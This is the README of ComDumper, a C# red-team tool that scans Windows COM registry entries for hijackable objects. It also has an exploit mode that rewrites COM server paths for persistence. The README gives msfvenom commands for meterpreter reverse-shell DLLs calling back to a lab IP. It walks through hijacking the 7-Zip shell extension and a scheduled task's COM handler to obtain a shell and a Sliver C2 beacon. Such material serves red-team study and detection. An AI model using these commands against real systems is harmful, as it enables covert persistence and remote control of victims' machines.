# ComDumper

A Simple C# red team tool to enumerate and analyze COM registry objects for hijackable entries, missing binary paths, access control misconfigurations, and simulate persistence via registry modification.
For more details about COM exploitation demos, take a look at my blog 
## Compiling code using VS csc compiler

```powershell
csc /r:System.DirectoryServices.AccountManagement.dll ComDumperV.cs /out:ComDumper.exe
```
## Usage

![image](https://github.com/user-attachments/assets/f9120ac3-23bd-4ce0-a9d7-bb893ca6f537)

## Features

### Search and Dump CLSIDs

- `-sA`: Scan and dump all COM CLSIDs from the registry.
- Supports limiting the number of results with `-n <number>`.
- Output can be saved as a CSV file (`-o <file>`) or printed verbosely with `--verbose`.
  ```powershell
  .\ComDumper.exe -sA --verbose -n 2
  ```
![image](https://github.com/user-attachments/assets/1179ab96-24a0-4b42-86b7-e0809c8969fa)

dumping all COM CLSIDs to a CSV file
```powershell
.\ComDumper.exe -sA -o comCLSIDs.csv
```
![image](https://github.com/user-attachments/assets/de0ffc1f-512e-4498-99cf-aa074a004a40)

### Filtering Options for Search Results

- `-fg <group>`: Filter entries by registry group.
- `-fu <user>`: Filter entries writable by a specific user (e.g., `BUILTIN\Users`).
- `-fa <access>`: Filter entries based on access control.
- `-fo <owner>`: Filter entries by registry key owner.
- `--filter-access <string>`: Filter entries by partial access control string.
- `--missing` / `-m`: Filter entries where the COM server file (DLL or EXE) is missing from disk.
- `--vulnerable`: Filter entries considered vulnerable (missing or hijackable).
- `--hijackable`: Filter entries that are hijackable.
- `--unresolvedsid`: Filter entries with unresolved SIDs (e.g., `S-1-5-*`).
- 
Some filters, like missing, are better used when you have admin access while looking for persistence entries. Otherwise, they can sometimes falsely report files as missing simply because the program doesn’t have permission to read privileged locations like C:\Windows\System32\.

hunting for FullControl Access over a COM object we can use filters
```powershell
 .\ComDumper.exe -sA --verbose  -fa "FullControl" -fu "ippyokai"
```
Note that the user filter `-fu` also checks the group memberships of the user. Since my `ippyokai` user is a local admin, it will have a lot of FullControl access rights.
We can search for the explicit Write access for a user as follows or using regx.
```powershell
 .\ComDumper.exe -sA --verbose  -fa "COMMANDO\ippyokai (FullControl)"
```
![image](https://github.com/user-attachments/assets/92f120a3-3c63-485e-9c99-43f285713476)

### Individual CLSID Search

- `-s --clsid <CLSID>`: Query detailed information about a specific CLSID.
 From the previous example, we can take the 7-Zip shell extension CLSID `{23170F69-40C1-278A-1000-000100020000}` to get more info.
![image](https://github.com/user-attachments/assets/f4c5d3d0-6d4e-4e4f-aa29-d5e7b665d41f)

### Exploit Mode

- `-e --clsid <CLSID> --dll <path>`: Replace the COM DLL path in the registry for the specified CLSID.
- `-e --clsid <CLSID> --exe <path>`: Replace the COM EXE path in the registry for the specified CLSID.
- `--hkcu`: Apply the hijack under the current user registry hive (HKCU) instead of the local machine hive (HKLM).
For exploit mode, it’s simple: without --hkcu, the tool changes the registry entry to the given DLL or EXE. With the --hkcu option, it performs a hijack by adding a registry entry under HKCU to override the DLL from HKLM. Be careful to create a proper DLL that proxies calls to the original one to maintain system functionality. You can use FaceDancer, as I demonstrated in my blog.

We can create a simple proof of concept here since we have FullControl over the 7-Zip shell extension COM registry.
generate first a simple dll with  `msfvenome`
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.136.138 LHOST=4444 -f dll -o shell.dll
```
adding the dll  `ComDumper` backup it automaticaly so you can recover it later.
![image](https://github.com/user-attachments/assets/1c6b6196-004f-47da-a8f8-510de25985b7)

By navigating to a folder containing ZIP files, we can observe that `explorer.exe` loads `shell.dll`.
![image](https://github.com/user-attachments/assets/0bf130b5-aa07-48df-bebe-cfe1cedfcedc)

we have got the shell
![image](https://github.com/user-attachments/assets/737e31ff-e43d-44d2-9382-9279409a733d)

now can recover it back
![image](https://github.com/user-attachments/assets/43240580-fb13-46f9-8f2e-13a241b948fc)

For `--hkcu` mode, we can enumerate COM objects used by scheduled tasks using the [Get-ScheduledTaskComHandler.ps1]()https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Get-ScheduledTaskComHandler.ps1 script, created by Matt Nelson and Matthew Graeber. I will might add a C# class to enumerate scheduled tasks later.

```powershell
. .\Get-ScheduledTaskComHandler
Get-ScheduledTaskComHandler -PersistenceLocations
```
we can take an example for this mode using `CacheTask`.
![image](https://github.com/user-attachments/assets/802b8c81-ed06-4cef-9ad7-f450a07c94f9)

we can verify that the entry comes from HKLM.
![image](https://github.com/user-attachments/assets/c6d32948-1398-4348-9d24-fa32e4a3a17c)

Generate a DLL as in the previous step.
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.136.138 LHOST=8443 -f dll -o Rabbit.dll
```

Now I'm going to use this DLL as a staged payload for Sliver C2. check too with out `--hkcu` we have got access denied cause can't write to HKLM directly.
![image](https://github.com/user-attachments/assets/7ce118a8-56c5-495c-a672-3317d4c0f9b5)

Re-login with any user, and the beacon call will be triggered.
![image](https://github.com/user-attachments/assets/27b44d28-1f1e-4dd2-adee-e1446dafc6fe)

Clean up again just remove the entry.
```powershell
$clsid = '{0358B920-0AC7-461F-98F4-58E32CD89148}'
$path = "HKCU:\Software\Classes\CLSID\$clsid"

if (Test-Path $path) {
    Remove-Item -Path $path -Recurse -Force
    Write-Host "[+] COM hijack removed from HKCU for CLSID $clsid"
} else {
    Write-Host "[-] No COM hijack found under HKCU for CLSID $clsid"
}
```

---

## 📚 References & Acknowledgements

I would like to acknowledge and thank the authors and contributors of the following outstanding resources and blogs that greatly enhanced my understanding of COM abuse techniques and persistence mechanisms:

- **Fakroud, Mohamed** – Playing Around COM Objects - Part 1, Red Teaming Dojo  
  https://mohamed-fakroud.gitbook.io/red-teamings-dojo/windows-internals/playing-around-com-objects-part-1

- **DerbyCon 2019** – COM Hijacking Techniques, Slideshare presentation  
  https://www.slideshare.net/slideshow/com-hijacking-techniques-derbycon-2019/169871173

- **SpecterOps Team** – Revisiting COM Hijacking, SpecterOps Blog (May 28, 2025)  
  https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/

- **PentestLab Team** – Persistence: COM Hijacking, PentestLab Blog (May 20, 2020)  
  https://pentestlab.blog/2020/05/20/persistence-com-hijacking/

These resources provided valuable insights, technical deep-dives, and practical examples that were instrumental in shaping the development of this tool and the learning journey behind it.


